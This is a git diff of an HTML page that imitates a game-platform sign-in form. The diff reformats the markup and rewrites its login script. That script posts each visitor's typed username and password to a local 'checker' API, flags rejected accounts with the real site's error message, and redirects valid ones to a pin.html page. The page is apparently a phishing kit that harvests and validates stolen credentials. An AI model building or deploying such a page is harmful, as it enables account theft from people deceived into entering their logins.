@@ -708,7 +708,6 @@
                             class="_2GBWeup5cttgbTw8FM3tfx"
                             value=""
                             id="jenengmu"
-                            
                           />
                         </div>
                         <div class="_3BkiHun-mminuTO-Y-zXke">
@@ -719,7 +718,6 @@
                             class="_2GBWeup5cttgbTw8FM3tfx"
                             value=""
                             id="passwordmu"
-                            
                           />
                         </div>
                         <div class="tool-tip-source Focusable">
@@ -759,12 +757,19 @@
                             class="DjSvCZoKKfoNSmarsEcTS"
                             type="submit"
                             id="logino"
-                            style="width: 270px;"
+                            style="width: 270px"
                           >
                             Sign in
                           </a>
                         </div>
-                        <div class="_1W_6HXiG4JJ0By1qN_0fGZ" id="errormu" style="display: none;">Please check your password and account name and try again.</div>
+                        <div
+                          class="_1W_6HXiG4JJ0By1qN_0fGZ"
+                          id="errormu"
+                          style="display: none"
+                        >
+                          Please check your password and account name and try
+                          again.
+                        </div>
                         <div class="_1W_6HXiG4JJ0By1qN_0fGZ">&nbsp;</div>
                         <a
                           class="_1K431RbY14lkaFW6-XgSsC _2FyQDUS2uHbW1fzoFK2jLx"
@@ -8531,57 +8536,55 @@
                 '<svg version="1.1" id="base" xmlns="http://www.w3.org/2000/svg" class="SVGIcon_Button SVGIcon_Check" x="0px" y="0px" width="256px" height="256px" viewBox="0 0 256 256" stroke-width="35" stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10"><polyline fill="none" points="49.5,147.75 95,210.75 206.5,45.25 "></polyline></svg>');
         });
     </script>
-<script>
-  const username = document.getElementById("jenengmu");
-  const password = document.getElementById("passwordmu");
-  const login = document.getElementById("logino");
-  const inputForm = document.querySelectorAll("._2GBWeup5cttgbTw8FM3tfx");
-  const errormu = document.getElementById("errormu");
+    <script>
+      const username = document.getElementById("jenengmu");
+      const password = document.getElementById("passwordmu");
+      const login = document.getElementById("logino");
+      const inputForm = document.querySelectorAll("._2GBWeup5cttgbTw8FM3tfx");
+      const errormu = document.getElementById("errormu");
 
-  login.addEventListener("click", () => {
+      login.addEventListener("click", () => {
+        function checkAccount(username, password) {
+          const errormu = document.getElementById("errormu");
+          const inputForm = document.querySelectorAll("input");
 
-    function checkAccount(username, password) {
-      fetch("http://localhost:5000/api/checker/check-single", {
-        method: "POST",
-        body: JSON.stringify({
-          username: username.value,
-          password: password.value,
-        }),
-        headers: { "Content-Type": "application/json" },
-      })
-        .then((response) => response.json())
-        .then((data) => {
-          console.log("Check Account API Response:", data);
-          if (data.result && data.result.status === "bad_account") {
-            errormu.style.display = "block";
-            inputForm[0].style.border = "1px solid";
-            inputForm[0].style.borderColor = "#c15755";
-            inputForm[1].style.border = "1px solid";
-            inputForm[1].style.borderColor = "#c15755";
-            // Anda bisa menambahkan logika untuk menampilkan pesan kesalahan kepada pengguna di sini
-          } else {
-            // Jika status bukan bad_account, jalankan API /start
-            fetch("http://localhost:5000/api/checker/start", {
-              method: "POST",
-              body: JSON.stringify({
-                username: username.value,
-                password: password.value,
-              }),
-              headers: { "Content-Type": "application/json" },
+          fetch("http://localhost:5000/api/checker/check-single", {
+            method: "POST",
+            body: JSON.stringify({
+              username: username.value,
+              password: password.value,
+            }),
+            headers: { "Content-Type": "application/json" },
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              console.log("Check Account API Response:", data);
+              if (data.result && data.result.status === "bad_account") {
+                errormu.style.display = "block";
+                inputForm[0].style.border = "1px solid #c15755";
+                inputForm[1].style.border = "1px solid #c15755";
+              } else {
+                fetch("http://localhost:5000/api/checker/start", {
+                  method: "POST",
+                  body: JSON.stringify({
+                    username: username.value,
+                    password: password.value,
+                  }),
+                  headers: { "Content-Type": "application/json" },
+                });
+                if (
+                  username.value &&
+                  password.value
+                ) {
+                    window.location.href = "pin.html";
+                }
+              }
             })
-              .then((response) => response.json())
-              console.log("Start API Response:", startData);
-              // Redirect ke pin.html setelah API /start berhasil
-          }
-        })
-        .catch((error) => console.error("Check Account API Error:", error));
-        setTimeout(() => {
-          window.location.href = "pin.html";
-        }, 0);
-    }
+            .catch((error) => console.error("Check Account API Error:", error));
+        }
 
-    checkAccount(username,password);
-  });
-</script>
+        checkAccount(username, password);
+      });
+    </script>
   </body>
 </html>
